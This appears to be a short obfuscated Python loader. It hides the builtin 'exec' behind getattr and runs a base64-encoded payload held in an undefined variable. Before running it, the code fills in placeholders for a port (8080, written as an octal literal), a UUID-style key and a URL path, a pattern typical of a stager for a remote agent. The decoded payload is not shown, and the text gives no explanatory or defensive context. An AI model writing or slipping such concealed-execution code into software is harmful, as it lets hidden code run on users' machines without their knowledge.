import sys
from base64 import b64decode

sys.__std__ = __builtins__
__builtins__.getattr(sys.__std__, "exec")(
    b64decode(_).decode("utf8").replace(str(int("0o17620", 8)), str(8080))
    .replace("__key__", "43455417-1613-42f0-b996-1885caf80cb2")
    .replace("__vl__", "/9183118a")
    .replace("__vm__", "")
    .replace("__tr__", "")
)